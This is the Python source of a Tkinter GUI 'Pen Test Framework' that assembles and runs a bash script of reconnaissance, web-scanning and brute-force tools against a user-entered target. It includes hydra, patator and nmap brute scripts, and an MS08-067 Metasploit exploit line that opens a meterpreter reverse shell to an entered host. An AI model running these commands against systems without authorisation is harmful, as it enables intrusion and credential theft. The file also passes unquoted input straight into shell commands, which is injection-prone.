 # imports

from Tkinter import *
from tkFileDialog import *
import subprocess
from subprocess import	 Popen, PIPE
import time
import datetime
import os
import signal
import random
import webbrowser
import colorama
from colorama import Fore, Back, Style

################################# Global Variables ##############################

root = Tk()
root.geometry("{0}x{1}+0+0".format(root.winfo_screenwidth(),root.winfo_screenheight()))

#Nmap Variables
NmapTarget 	= StringVar()
Subnet 		= StringVar()
Ports 		= StringVar()
var 		= StringVar()
var.set("")
var2 		= StringVar()
var2.set("") 
var3 		= StringVar()
var4		= StringVar()


#Vulnerability Assesment Variables
extVar	= StringVar()
Target 	= StringVar()
FlagsVar= IntVar()
Flags 	= StringVar()

Target.set("ex:192.168.1.5")

TargetPort	= StringVar()

# Recon Win Vars
WhoisVar 		= IntVar()
dnsmapVar 		= IntVar()
DigVar 			= IntVar()
FierceVar 		= IntVar()
DNSenumVar 		= IntVar()
GoogleSearchVar = IntVar()


# Scanning Win Vars
NetDiscover		= IntVar()
ArpscanVar		= IntVar()
TracerouteVar 	= IntVar()
NetdiscoverVar	= IntVar()
PortScanningVar = IntVar()
nmapVar			= IntVar()
VulnScanningVar = IntVar()
NetcatVar	 	= IntVar()
Wafw00fVar		= IntVar()
LbdVar 			= IntVar()
PingVar 		= IntVar()
Enum4linuxVar	= IntVar()
TheharvesterVar	= IntVar()

# Web App Win Vars
ArachniVar 		= IntVar()
HttrackVar		= IntVar()
NiktoVar 		= IntVar()
SkipfishVar 	= IntVar()
WpscanVar 		= IntVar()
JoomscanVar 	= IntVar()
w3afVar 		= IntVar()
w3afVar2 		= IntVar()

HeartbleedVar   = IntVar()
SslscanVar		= IntVar()
IkescanVar		= IntVar()
MetagoofilVar   = IntVar()
WigVar			= IntVar()
UniscanVar		= IntVar()
CutycaptVar		= IntVar()
DirbVar			= IntVar()
# Password cracking Win Vars

PatatorVar		= IntVar()
PatatorVar2		= StringVar()
HydraVar		= IntVar()
HydraVar2		= StringVar()
UsernamesList	= 'uninitialized'
PasswordsList 	= 'uninitialized'
username = StringVar()
password = StringVar()

#Exploit
ms08Var			= IntVar()
lhost			= StringVar()
lhost.set("enter localhost")

# Vars
ParallelVar		= IntVar()
TerminalVar		= IntVar()
pcapVar			= IntVar()

def donothing():
	print " -- "
	
print "Welcome to Penetration Testing FrameWork"
	
###################### Script Running Proccess #########################

def RunScript():
	global num1
	process_stat = ''
	now = time.localtime(time.time())
	clock = str(time.strftime("%y-%m-%d", now))
	print Fore.GREEN +"Starting Scan " + str(clock)

	
	#p = subprocess.Popen(command , shell=False)
	#p = subprocess.Popen("tcpdump -w ~/Desktop/Pentests/"+str(Target.get())+"/"+str(Target.get())+"-"+clock+".pcap"+ ""  , shell=True)	
	#report = "Report"+str(num1)+".txt"
	if ParallelVar.get() == 1 and pcapVar.get() == 0:
		print Fore.WHITE +"################################################################################"
		print Fore.WHITE +"#                                                                              #"
		print Fore.WHITE +"# Running Script , Exporting results in html report                            #"
		print Fore.WHITE +"#                                                                              #"
		print Fore.WHITE +"################################################################################"
		p2 = subprocess.Popen("./Pentest.sh ", shell=True)
		while True:
			
		
			pg1 = subprocess.Popen(['pgrep', '-l' , 'Pentest'], stdout=subprocess.PIPE)
			
			out, err = pg1.communicate()
		
			if "Pentest" not in out:
			
				print(Fore.RED + "Scan has finished ! Are you ready for the next one?")
				print(Fore.RED + "Report saved at /Desktop/Pentests/$target")
				break

			for line in out.splitlines():        
				line = bytes.decode(line)
				pid = int(line.split(None, 1)[0])
				time.sleep(2)
				
							
				print (Fore.GREEN +"Process " + str(pid) + " pentest.sh running........." )
				
				
			
			
		
			
	elif ParallelVar.get() == 1 and pcapVar.get() ==1:
		print Fore.WHITE +"##########################################################################"
		print Fore.WHITE +"#                                                                        #"
		print Fore.WHITE +"# Running Script , Creates html Report and Packet Capture File          #"
		print Fore.WHITE +"#                                                                        #"
		print Fore.WHITE +"##########################################################################"


		p = subprocess.Popen("tcpdump -w ~/Desktop/Pentests/"+str(Target.get())+"/"+str(Target.get())+"-"+clock+".pcap"+ ""  , shell=True)	
		time.sleep(2)
		p2 = subprocess.Popen("./Pentest.sh ", shell=True)

		c=0
		c2=0
		while True:
			pg1 = subprocess.Popen(['pgrep', '-l' , 'Pentest'], stdout=subprocess.PIPE)
			pg2 = subprocess.Popen(['pgrep', '-l' , 'tcpdump'], stdout=subprocess.PIPE)
		
			out, err = pg1.communicate()
			out2, err = pg2.communicate()
			for line in out.splitlines():        
				line = bytes.decode(line)
				pid = int(line.split(None, 1)[0])
				time.sleep(2)
				c = c +1

				#print c  # 
				#print pid
				print (Fore.GREEN +"Process " + str(pid) + " pentest.sh running........." )

				
			for line in out2.splitlines():        
				line = bytes.decode(line)
				pid2 = int(line.split(None, 1)[0])
				time.sleep(2)
				c2 = c2 +1
				
				#print c2
				#print pid2
				print (Fore.YELLOW + "Process " + str(pid2) + " tcpdump    running.........")

			

					
			if c2 > c+3:
				print (Fore.RED + "Process Pentest.sh has stop , time to kill tcpdump")
				try:
					os.kill(int(pid2) , 9)
				#	os.kill(p.pid, 0)
				#	p.kill()
					print (Fore.RED + "Process Killed")
					print (Fore.RED + "Scan has finished ? Are you ready for the next one?")
					print (Fore.RED + "Report and pcap file saved at    /Desktop/Pentests/$target")

					break
				except OSError, e:
					print "Terminated gracefully"
	elif TerminalVar.get() == 1 and pcapVar.get() == 0:
		print Fore.WHITE +"################################################################################"
		print Fore.WHITE +"#                                                                              #"
		print Fore.WHITE +"# Running Script and Displays Results Terminal                                 #"
		print Fore.WHITE +"#                                                                              #"
		print Fore.WHITE +"################################################################################"
		p2 = subprocess.Popen("./Pentest.sh ", shell=True)
		while True:
			
		
			pg1 = subprocess.Popen(['pgrep', '-l' , 'Pentest'], stdout=subprocess.PIPE)
			
			out, err = pg1.communicate()
		
			if "Pentest" not in out:
				print Fore.RED +" Scan has finished ? Are you ready for the next one?" 
				break

			for line in out.splitlines():        
				line = bytes.decode(line)
				pid = int(line.split(None, 1)[0])
				time.sleep(2)
				
							
				#print "Process " + str(pid) + " pentest.sh running........."
				
				
	
	elif pcapVar.get() ==1 and TerminalVar.get() ==1:
		print Fore.WHITE +"################################################################################"
		print Fore.WHITE +"#                                                                              #"
		print Fore.WHITE +"# Running Script , Displays Results Terminal and Creates Packet Capture File   #"
		print Fore.WHITE +"#                                                                              #"
		print Fore.WHITE +"################################################################################"
		p = subprocess.Popen("tcpdump -w ~/Desktop/Pentests/"+str(Target.get())+"/"+str(Target.get())+"-"+clock+".pcap"+ ""  , shell=True)	
		time.sleep(2)
		p2 = subprocess.Popen("./Pentest.sh ", shell=True)

		c=0
		c2=0
		
		while True:
			pg1 = subprocess.Popen(['pgrep', '-l' , 'Pentest'], stdout=subprocess.PIPE)
			pg2 = subprocess.Popen(['pgrep', '-l' , 'tcpdump'], stdout=subprocess.PIPE)
		
			out, err = pg1.communicate()
			out2, err = pg2.communicate()
			for line in out.splitlines():        
				line = bytes.decode(line)
				pid = int(line.split(None, 1)[0])
				time.sleep(2)
				c = c +1
				
			
			for line in out2.splitlines():        
				line = bytes.decode(line)
				pid2 = int(line.split(None, 1)[0])
				time.sleep(2)
				c2 = c2 +1
				
			if c2 > c+3:
				print (Fore.RED + "Process Pentest.sh has stop , time to kill tcpdump")
				try:
					os.kill(int(pid2) , 9)
				#	os.kill(p.pid, 0)
				#	p.kill()
					print (Fore.RED + "Process Killed")
					print (Fore.RED + "Scan has finished ? Are you ready for the next one?")
					
					break
				except OSError, e:
					print "Terminated gracefully"
	else:
			print (Fore.RED + "Penetest.sh Bash Script Created....")
			print (Fore.RED + "Select the right output configuration and push the fire button again")
		


################################# Programms  ##############################

def Start():
	if ParallelVar.get() == 1:
		SelectedProgramms = ''
		p = 0
		directory = str(Target.get())
		directory = directory.replace('/',':')
		subprocess.call(" > Pentest.sh " ,shell=True)
		path = "~/Desktop/Pentests/"
		subprocess.call(" mkdir ~/Desktop/Pentests" ,shell=True)
		subprocess.call(" mkdir " + path +directory ,shell=True)
		subprocess.call(" cp  -R ~/Desktop/Pentests/report ~/Desktop/Pentests/"+directory ,shell=True)

		with open("Pentest.sh",'a') as f1:
			f1.write("#!/bin/bash\n")

		if FlagsVar.get() == 1:
			p = p +1
			with open("Pentest.sh",'a') as f1:
				f1.write( Flags.get() + " >> ~/Desktop/Pentests/"+Target.get()+"/report/data/whois.htm "+ " \n")
		if WhoisVar.get() == 1:
			p = p +1
			with open("Pentest.sh",'a') as f1:
				f1.write("echo Starting whois \n")
				f1.write("whois " + Target.get()  +" >> ~/Desktop/Pentests/"+Target.get()+"/report/data/whois.htm "+ " \n")
		if dnsmapVar.get() == 1:
			p = p +1
			with open("Pentest.sh",'a') as f1:
				f1.write("echo Starting dnsmap \n")
				f1.write("dnsmap " + Target.get()  + " >> ~/Desktop/Pentests/"+Target.get()+"/report/data/nslookup.htm "+" \n")
		if DigVar.get() == 1:
			p = p +1
			with open("Pentest.sh",'a') as f1:
				f1.write("echo Starting dig \n")
				f1.write("dig " + Target.get()+ " >> ~/Desktop/Pentests/"+Target.get()+"/report/data/dig.htm "+" \n")
				f1.write("dig  -x " + Target.get()+" >> ~/Desktop/Pentests/"+Target.get()+"/report/data/dig.htm "+" \n")
		if FierceVar.get() == 1:
			p = p +1
			with open("Pentest.sh",'a') as f1:
				f1.write("echo Starting fierce \n")
				f1.write("fierce -dns " + Target.get()+" >> ~/Desktop/Pentests/"+Target.get()+"/report/data/fierce.htm  "+" \n")
		if DNSenumVar.get() == 1:
			p = p +1
			print "DNSenum"	
			with open("Pentest.sh",'a') as f1:
				f1.write("echo Starting dsnenum \n")
				f1.write("dnsenum " + Target.get()+" >> ~/Desktop/Pentests/"+Target.get()+"/report/data/dnsenum.htm" +"\n")
		if TheharvesterVar.get() == 1:
			p = p +1
			print "the harvester"	
			with open("Pentest.sh",'a') as f1:
				f1.write("theharvester  -d " + Target.get()  + " -l 500 -b google " + " >> ~/Desktop/Pentests/"+Target.get()+"/report/data/theharvester.htm 2>&1"+" \n")
				f1.write("theharvester  -d " + Target.get()  + " -l 500 -b linkedin " + " >> ~/Desktop/Pentests/"+Target.get()+"/report/data/theharvester.htm 2>&1"+" \n")
		if TracerouteVar.get() == 1:
			p = p +1
			with open("Pentest.sh",'a') as f1:
				f1.write("echo Starting traceroute \n")
				f1.write("traceroute " + Target.get()+ " >> ~/Desktop/Pentests/"+Target.get()+"/report/data/traceroute.htm "+"\n")
		if PortScanningVar.get() == 1:
			p = p +1
			with open("Pentest.sh",'a') as f1:
					f1.write("echo Starting nmap Version  \n")
					f1.write("nmap -A  " + Target.get()+  " >> ~/Desktop/Pentests/"+Target.get()+"/report/data/nmap.htm "+ "\n" )
		if nmapVar.get() == 1:
			p = p +1
			with open("Pentest.sh",'a') as f1:
					f1.write("echo Starting nmap \n")
					f1.write("nmap " + Target.get()+ " >> ~/Desktop/Pentests/"+directory+"/report/data/nmap.htm "+ "\n")
		if ArpscanVar.get()== 1:
			p = p +1
			with open("Pentest.sh" ,'a') as f1:
				f1.write("echo Starting arp-scan \n")
				f1.write("arp-scan "+ Target.get()+" >> ~/Desktop/Pentests/"+directory+"/report/data/arpscan.htm "+"\n")
		if NetdiscoverVar.get()== 1:
			p = p +1
			with open("Pentest.sh",'a') as f1:
				f1.write("echo Starting netdiscover \n")
				f1.write("netdiscover -P -r " + Target.get()+ " "+" >> ~/Desktop/Pentests/"+directory+"/report/data/netdiscover.htm "+"\n")		
		if Wafw00fVar.get()== 1:
			p = p +1
			with open("Pentest.sh",'a') as f1:
				f1.write("wafw00f " + Target.get()+ " >> ~/Desktop/Pentests/"+Target.get()+"/report/data/wafwoof.htm "+"\n")
		if LbdVar.get()== 1:
			p = p +1
			with open("Pentest.sh",'a') as f1:
				f1.write("echo Starting load balancer detector \n")
				f1.write("/usr/bin/lbd " + Target.get()+" >> ~/Desktop/Pentests/"+Target.get()+"/report/data/lbd.htm "+"\n")	
		if PingVar.get() == 1:
			p = p +1
			with open("Pentest.sh",'a') as f1:
				f1.write("echo Starting ping \n")
				f1.write("hping3 -c 10 " + Target.get()+" >> ~/Desktop/Pentests/"+Target.get()+"/report/data/hping.htm 2>&1 "+"\n")
		if Enum4linuxVar.get()== 1:
			p = p +1
			with open("Pentest.sh",'a') as f1:
				f1.write("echo Starting enum4linux \n")
				f1.write("enum4linux " + Target.get()+" >> ~/Desktop/Pentests/"+Target.get()+"/report/data/enum4linux.htm "+"\n")	
		if HttrackVar.get()== 1:
			p = p +1
			with open("Pentest.sh",'a') as f1:
				f1.write("echo Starting httrack \n")
				f1.write("httrack http://"+ Target.get()+ " -O ~/Desktop/Pentests/"+Target.get()+"\n" )
		if ArachniVar.get() == 1:
			p = p +1
			with open("Pentest.sh",'a') as f1:
				f1.write("echo Starting arachni \n")
				f1.write("arachni http://"+Target.get() 	+" >> ~/Desktop/Pentests/"+Target.get()+"/report/data/arachni.htm "+"\n")
		if NiktoVar.get() == 1:
			p = p +1
			with open("Pentest.sh",'a') as f1:
				f1.write("echo Starting nikto \n")
				f1.write("nikto -host "  + Target.get() +" >> ~/Desktop/Pentests/"+Target.get()+"/report/data/nikto.htm "+ "\n")
		if UniscanVar.get() == 1:
			p = p +1
			with open("Pentest.sh",'a') as f1:
				f1.write("echo Starting uniscan \n")
				f1.write("uniscan -u http://"  + Target.get()+ "  -qweds  "+ " >> ~/Desktop/Pentests/"+Target.get()+"/report/data/uniscan.htm "+" \n")
		if SkipfishVar.get() == 1:
			p = p + 1
			with open("Pentest.sh" ,'a') as f1:
				f1.write("echo Starting skipfish \n")
				f1.write("skipfish -u -o " +"~/Desktop/Pentests/"+Target.get()+"/report/data/"+"Skipfish-report" + " http://"+Target.get()+ "  \n" )
		if JoomscanVar.get() == 1:
			p = p +1
			with open("Pentest.sh",'a') as f1:
				f1.write("echo Starting joomscan \n")
				f1.write("joomscan -u " +Target.get() + " >> ~/Desktop/Pentesigts/"+Target.get()+"/report/data/joomscan.htm "+ "\n")
		if WpscanVar.get() == 1:
			p = p +1
			with open("Pentest.sh",'a') as f1:
				f1.write("echo Starting wpscan \n")
				f1.write("wpscan --url " +Target.get() + " >> ~/Desktop/Pentests/"+Target.get()+"/report/data/wpscan.htm "+ "\n")
		if HeartbleedVar.get() == 1:
			p = p +1
			with open("Pentest.sh",'a') as f1:
				f1.write("echo Starting heartbleed \n")
				f1.write("python heartbleed.py " + Target.get() +" >> ~/Desktop/Pentests/"+Target.get()+"/report/data/heartbleed.htm "+ "\n" )
		if SslscanVar.get() == 1:
			p = p +1
			with open("Pentest.sh",'a') as f1:
				f1.write("echo Starting sslscan \n")
				f1.write("sslscan  " + Target.get() + " >> ~/Desktop/Pentests/"+Target.get()+"/report/data/sslscan.htm "+"\n" )
		if IkescanVar.get() == 1:
			p = p +1
			with open("Pentest.sh",'a') as f1:
				f1.write("echo Starting ike-scan \n")
				f1.write("ike-scan  " + Target.get() + " >> ~/Desktop/Pentests/"+Target.get()+"/report/data/ike-sacn.htm "+"\n" )
		if MetagoofilVar.get() == 1:
			p = p +1
			with open("Pentest.sh" ,'a') as f1:
				f1.write("echo Starting metagoofil \n")
				f1.write( "metagoofil -d " + Target.get() + " -t  doc,pdf,xls,docx -l 100 -n 10  -o " + " ~/Desktop/Pentests/"+Target.get()+"/Metadata" + " >> ~/Desktop/Pentests/"+Target.get()+"/report/data/metagoofil.htm "+"\n" )
		if WigVar.get() == 1:
			p = p +1
			with open("Pentest.sh" , 'a') as f1:
				f1.write("echo Starting wig \n")
				f1.write( "cd   \n")
				f1.write( "cd WIG \n")
				f1.write( "python3 wig.py http://"+Target.get()+"/"+ ">> ~/Desktop/Pentests/"+Target.get()+"/report/data/wig.htm " +"\n")
		if DirbVar.get() == 1:
			p = p +1
			with open("Pentest.sh" , 'a') as f1:
				f1.write("echo Starting dirb \n")
				f1.write( "dirb  http://"+Target.get()+ " -S " + " >> ~/Desktop/Pentests/"+Target.get()+"/report/data/dirb.htm "+"\n")		
		if PatatorVar.get() == 1:
			p = p +1
			with open("Pentest.sh",'a') as f1:
				f1.write("echo Starting patator \n")
				f1.write("patator " +PatatorVar2.get() + " host="+Target.get() +" user=FILE1 1="+ username.get() + " password=FILE0 0="+ password.get() + " -x ignore:mesg='Authentication failed.'" + ">> ~/Desktop/Pentests/"+Target.get()+"/report/data/hydra.htm 2>&1 &"+"\n" )
		if HydraVar.get() == 1:
			p = p + 1
			with open("Pentest.sh",'a') as f1:
				f1.write("echo Starting hydra \n")
				f1.write("hydra -L " + username.get() + " -P " + password.get() + " "+ Target.get() + " " + HydraVar2.get()+ " -f" + " >> ~/Desktop/Pentests/"+Target.get()+"/report/data/hydra.htm &""\n"  )
		if p == 0:
			print "No programs selected"
		else:
			RunScript()
	else:
		p = 0
		subprocess.call(" > Pentest.sh " ,shell=True)
		path = "~/Desktop/Pentests/"
		subprocess.call(" mkdir ~/Desktop/Pentests" ,shell=True)
		subprocess.call(" mkdir " + path +Target.get() ,shell=True)

		with open("Pentest.sh",'a') as f1:
			f1.write("#!/bin/bash\n")
		print "The following programs will run"
		if FlagsVar.get() == 1:
			p = p +1
			print "our own command"
			with open("Pentest.sh",'a') as f1:
				f1.write( Flags.get() )
		if WhoisVar.get() == 1:
			p = p +1
			print "whois"
			with open("Pentest.sh",'a') as f1:
				f1.write("whois " + Target.get() + "\n")
		if dnsmapVar.get() == 1:
			p = p +1
			print "dnsmap"
			with open("Pentest.sh",'a') as f1:
				f1.write("dnsmap " + Target.get() +"\n")
		if DigVar.get() == 1:
			p = p +1
			print "dig"
			with open("Pentest.sh",'a') as f1:
				f1.write("dig " + Target.get()+"\n")
				f1.write("dig SOA " + Target.get()+"\n")
				f1.write("dig  -x " + Target.get()+"\n")
		if FierceVar.get() == 1:
			p = p +1
			print "fierce"
			with open("Pentest.sh",'a') as f1:
				f1.write("fierce -dns " + Target.get()+"\n")
		if DNSenumVar.get() == 1:
			p = p +1
			print "dnsenum"
			with open("Pentest.sh",'a') as f1:
				f1.write("dnsenum " + Target.get() +"\n")
		if TheharvesterVar.get() == 1:
			p = p + 1
			print "theharvester"
			with open("Pentest.sh",'a') as f1:
				f1.write("theharvester  -d " + Target.get()  + " -l 500 -b google " + "\n")
				f1.write("theharvester  -d " + Target.get()  + " -l 500 -b linkedin "+"\n")
		if TracerouteVar.get() == 1:
			p = p +1
			print "traceroute"
			with open("Pentest.sh",'a') as f1:
				f1.write("traceroute " + Target.get()+ " \n")
		if PortScanningVar.get() == 1:
			p = p +1
			print "nmap version"
			with open("Pentest.sh",'a') as f1:
				f1.write("nmap -A "  + Target.get() +"\n")
		if nmapVar.get() == 1:
			p = p +1
			print "nmap"
			with open("Pentest.sh",'a') as f1:
				f1.write("nmap " + Target.get()+ "\n") 
		if ArpscanVar.get()== 1:
			p = p +1
			print "arp-scan"
			with open("Pentest.sh" ,'a') as f1:
				f1.write("arp-scan "+ Target.get() +"\n")
		if NetdiscoverVar.get()== 1:
			p = p +1
			print "netdiscover"
			with open("Pentest.sh",'a') as f1:
				f1.write("netdiscover -r " + Target.get()+ " -P  \n")				
		if Wafw00fVar.get()== 1:
			p = p +1
			print "wafw00f"
			with open("Pentest.sh",'a') as f1:
				f1.write("wafw00f " + Target.get()+"\n")
		if LbdVar.get()== 1:
			p = p +1
			print "lbd"
			with open("Pentest.sh",'a') as f1:
				f1.write("/usr/bin/lbd " + Target.get()+"\n")	
		if PingVar.get() == 1:
			p = p +1
			print "ping"
			with open("Pentest.sh",'a') as f1:
				f1.write("ping -c 10 " + Target.get()+"\n")
		if Enum4linuxVar.get()== 1:
			p = p +1
			print "enum4linux"
			with open("Pentest.sh",'a') as f1:
				f1.write("enum4linux " + Target.get()+"\n")	
		if HttrackVar.get()== 1:
			p = p +1
			print "httrack"
			with open("Pentest.sh",'a') as f1:
				f1.write("httrack http://"+ Target.get()+ " -O ~/Desktop/Pentests/"+Target.get()+"\n" )
		if ArachniVar.get() == 1:
			p = p +1
			print "arachni"
			with open("Pentest.sh",'a') as f1:
				f1.write("arachni http://"+Target.get() + " --only-positives "+"\n")
		if NiktoVar.get() == 1:
			p = p +1
			print "nikto"
			with open("Pentest.sh",'a') as f1:
				f1.write("nikto -host "  + Target.get() + "\n")
		if UniscanVar.get() == 1:
			p = p +1
			print "uniscan"
			with open("Pentest.sh",'a') as f1:
				f1.write("uniscan -u http://"  + Target.get()+"/  -bqweds"+ "\n")
		if SkipfishVar.get() == 1:
			p = p + 1
			print "skipfish"
			with open("Pentest.sh" ,'a') as f1:
				f1.write("skipfish -u -o " +"~/Desktop/Pentests/"+Target.get()+"/"+"Skipfish-report" + " http://"+Target.get() )
		if JoomscanVar.get() == 1:
			p = p +1
			with open("Pentest.sh",'a') as f1:
				p = p +1
				print "joomscan"
				f1.write("joomscan -u " +Target.get() +  "\n")
		if WpscanVar.get() == 1:
			p = p +1
			print "wpscan"
			with open("Pentest.sh",'a') as f1:
				f1.write("wpscan --url " +Target.get() +  "\n")
		if HeartbleedVar.get() == 1:
			p = p +1
			print "heartbleed"
			with open("Pentest.sh",'a') as f1:
				f1.write("python heartbleed.py " + Target.get() + "\n" )
		if SslscanVar.get() == 1:
			p = p +1
			print "sslscan"
			with open("Pentest.sh",'a') as f1:
				f1.write("sslscan  " + Target.get() + "\n" )
		if IkescanVar.get() == 1:
			p = p +1
			print "ike-scan"
			with open("Pentest.sh",'a') as f1:
				f1.write("ike-scan  " + Target.get() + "\n" )
		if MetagoofilVar.get() == 1:
			p = p +1
			print "metagoofil"
			with open("Pentest.sh" ,'a') as f1:
				f1.write( "metagoofil -d " + Target.get() + " -t  doc,pdf,xls,docx -l 150 -n 15  -o " + "~/Desktop/Pentests/"+Target.get()+"/Metadata")
		if WigVar.get() == 1:
			p = p +1
			print "wig"
			with open("Pentest.sh" , 'a') as f1:
				f1.write( "cd  \n")
				f1.write( "cd WIG  \n")
				f1.write( "python3 wig.py http://"+Target.get()+"/"+ "\n")
		if DirbVar.get() == 1:
			p = p +1
			print "dirb"
			with open("Pentest.sh" , 'a') as f1:
				f1.write( "dirb http://"+Target.get() + "\n")		
		if PatatorVar.get() == 1:
			p = p +1
			print "patator"
			with open("Pentest.sh",'a') as f1:
				f1.write("patator " +PatatorVar2.get() + " host="+Target.get() +" user=FILE1 1="+ username.get() + " password=FILE0 0="+ password.get() + " -x ignore:mesg='Authentication failed.'" + "\n" )
		if HydraVar.get() == 1:
			p = p + 1
			print "hydra"
			with open("Pentest.sh",'a') as f1:
				f1.write("hydra -L " + username.get() + " -P " + password.get() + " "+ Target.get() + " " + HydraVar2.get()+ " -f" +"\n"  )
		if ms08Var.get() == 1:
			p = p +1
			with open("Pentest.sh" , 'a') as f1:
				f1.write( "msfcli exploit/windows/smb/ms08_067_netapi RHOST=" +Target.get()+ " PAYLOAD=windows/meterpreter/reverse_tcp LHOST="+ lhost.get() + " e " + "\n")	
		if p == 0:
			print "No programs Selected...."
		else:
			print "Total programs = 	" + str(p)
			RunScript()

	
		
################################# nmap ##############################


def ScanWin():
	root = Toplevel()
	root.geometry ("700x500")

def nmap():
	if not TargetPort.get():
		Scan = "nmap "+ var4.get() + var.get() +" "+ var2.get() + " " + TargetPort.get() +" " + Target.get() + " " +var3.get() 
		
	else:
		Scan = "nmap "+ var4.get() + var.get() +" "+ var2.get() + " " + "-p " + TargetPort.get() +" " + Target.get() + " "+ var3.get() 
	
	with open("Nmap.txt",'a') as f1:
		f1.write(Scan + "\n")
	subprocess.call(" > Pentest.sh " ,shell=True)	
	with open("Pentest.sh",'a') as f1:
		f1.write("#!/bin/bash\n")
		f1.write(Scan + "\n")	
	print "start"
	subprocess.call("./Pentest.sh", shell=True)
	print "end"
	
def nmapWin():
	
		root = Toplevel()
		root.geometry ("800x700")
		TargetIpLabel = Label (root , text = "Target IP").grid(row =0 , column =0 , sticky=W)
		TargetIpEntry = Entry (root , textvariable = Target) .grid(row =1 , column = 0 , sticky=W)
		
		SubnetLabel = Label (root , text = "Specific Ports").grid(row =0 , column =1 , sticky=W)
		SubnetEntry = Entry (root , textvariable = TargetPort).grid(row =1 , column = 1, sticky=W)
		
		FlagsLabel = Label (root , text = "Flags").grid(row =3 , column =0, sticky=W)
		option = OptionMenu(root, var, "-sT", "-sS", "-sN", "-sX" , "-sA" , "-sW", "-sR" , "-sP" , "-sU" , " ").grid(row =4 , column =0, sticky=W)
		
		FlagsLabel2 = Label (root , text = "Flags 2").grid(row =3 , column =1, sticky=W)
		option = OptionMenu(root, var2, "-Pn", "-O", "-sV", "-A" , "-P" , "-f", "-e" , " ").grid(row =4 , column =1, sticky=W)
		
		ScriptsLabel = Label (root , text = "nmap Scripts").grid(row =3 , column =3 , sticky=W)
		option = OptionMenu(root, var3, 
		 " -p80,443 --script http-methods"  ,
		 " -p80,443 --script http-methods --script-args http-methods.retest  ",
		 " --script http-enum -p80  ",
		 " -sV --script=http-headers -p 80 ",
		 " -p80 --script http-userdir-enum ", 
		 " -p80 --script http-default-accounts " ,
		 " -p80 --script http-waf-detect " ,
		 " -p3306 --script mysql-empty-password " ,
		 " -p3306 --script mysql-brute " , 
		 " -p1433 --script ms-sql-brute ",
		 " -sV --script oracle-brute --script-args oracle-brute.sid=TEST " ,
		 " -p1433 --script ms-sql-info "   ,
		 " -p1433 --script ms-sql-empty-password -v ",
		 " -p 27017 --script mongodb-databases " ,
		 " -p 27017 --script mongodb-info ",
		 " -p25 --script smtp-brute " ,
		 " -p25 --script smtp-enum-users " ,
		 " -sV --script smtp-strangeport " ,
		 " -p143 --script imap-brute " ,
		 " -p143,993 --script imap-capabilities ",
		 " -p110 --script pop3-brute " ,
		 " -p110 --script pop3-capabilities "
		 " -sU -p 53 --script=dns-random-srcport ",
		 " -sU -p 53 --script=dns-random-txid " ,  
		 " -sU -p 53 --script=dns-recursion ").grid(row =4 , column =3)
		
		FlagsLabel2 = Label (root , text = "Timing Flags").grid(row =3 , column =2, sticky=W)
		option = OptionMenu(root, var4, ""," -T0 ", " -T1 ", " -T2 ", " -T3 " , " -T4 " , " -T5 ").grid(row =4 , column =2, sticky=W)	
		
		addLog= Button(root, text="Scan", command=nmap).grid( row = 1 , column = 3, sticky=W)
		Exit = Button(root, text='Close', command=root.destroy).grid(row=  5 , column =0, sticky=W)


################################# Graphical User Interface ##############################


def SaveConfig():
	PingVar.set('1')
	nmapVar.set('1')
	TracerouteVar.set('1')
	SslscanVar.set('1')
	NiktoVar.set('1')
	SkipfishVar.set('1')
	WpscanVar.set('1')
	JoomscanVar.set('1')
	HeartbleedVar.set('1')
	MetagoofilVar.set('1')
	
def ClearButtons():
	ArachniVar.set('0')
	NiktoVar.set('0')
	SkipfishVar.set('0')
	WpscanVar.set('0')
	JoomscanVar.set('0')
	w3afVar.set('0')
	HeartbleedVar.set('0')
	MetagoofilVar.set('0')
	ArpscanVar.set('0')
	NetdiscoverVar.set('0')
	Enum4linuxVar.set('0')
	DirbVar.set('0')
	HttrackVar.set('0')
	ms08Var.set('0')
	UniscanVar.set('0')
	PatatorVar.set('0')
	HydraVar.set('0')
	IkescanVar.set('0')
	WhoisVar.set('0')
	dnsmapVar.set('0')
	DigVar.set('0')
	WigVar.set('0')
	TheharvesterVar.set('0')
	PortScanningVar.set('0')
	nmapVar.set('0')
	FierceVar.set('0')
	DNSenumVar.set('0')
	GoogleSearchVar.set('0')
	SslscanVar.set('0')
	PingVar.set('0')
# Scanning Win Vars
	TracerouteVar.set('0')
	PortScanningVar.set('0')
	VulnScanningVar.set('0')
	Wafw00fVar.set('0')
	LbdVar.set('0')
	PingVar.set('0')

def Exiftool():
	fileName = askopenfilename(parent=root)
	with open("Pentest.sh",'w') as f1:
		f1.write("#!/bin/bash\n")
		f1.write("exiftool " + fileName )
	print "start"
	subprocess.call("./Pentest.sh", shell=True)
	print "end"

	
######################### Menu Area ######################

menubar = Menu(root)
Fi = Menu(root, tearoff = 0)

Fast = Menu (root)

OnlineTools = Menu (root)


Information_Gathering = Menu (root)
Information_Gathering.add_command(label ="nmap", command = nmapWin)
Information_Gathering.add_command(label ="Exiftool" , command = Exiftool )

Vulnerability_Analysis = Menu (root)

Web_Applications = Menu (root)


filemenu = Menu(menubar, tearoff=0)
filemenu.add_cascade(label="Information Gathering", menu = Information_Gathering)

filemenu.add_separator()

filemenu.add_command(label="Exit", command=root.quit)			
menubar.add_cascade(label="Tools", menu=filemenu)
editmenu = Menu(menubar, tearoff=0)
editmenu.add_command(label="extend", command=donothing)

editmenu.add_separator()

menubar.add_cascade(label="extend", menu=editmenu)
helpmenu = Menu(menubar, tearoff=0)
helpmenu.add_command(label="Help Index", command=donothing)
helpmenu.add_command(label="About...", command=donothing)
menubar.add_cascade(label="Help", menu=helpmenu)


######################### Canvas-CheckBox Area ######################

Label2 = Label (root , text = "Pen Test Framework" , font = "Helvetica 13 bold italic").grid(row = 0 , column = 3)

TargetLabel = Label (root , text = "Target Host or Ip" , font = "Helvetica 14 bold  " ).grid(row = 2 , column = 1, sticky=W)
TargetEntry = Entry (root, textvariable = Target ,    bg = 'grey' ,   width = 20).grid(row = 2 , column = 2,sticky=W )
TargetLabel = Label (root , text = "Enter your own command").grid(row = 3 , column = 1, sticky=W)
TargetEntry = Entry (root, textvariable = Flags , width = 30).grid(row = 3 , column = 2,sticky=W )
TargetLabel = Label (root , text = "Click to apply").grid(row = 4 , column = 1, sticky=W)
C= Checkbutton(root, 			  variable = FlagsVar,	  onvalue = 1, offvalue = 0).grid(row = 4,  column = 2	, sticky=W)

TargetLabel = Label (root , text = "Network Live Host",font = "Helvetica 14 underline").grid(row = 5 , column = 1, sticky=W)

C= Checkbutton(root, text = "Arp-scan" ,			  variable = ArpscanVar,	  onvalue = 1, offvalue = 0).grid(row = 6,  column = 1, sticky=W)
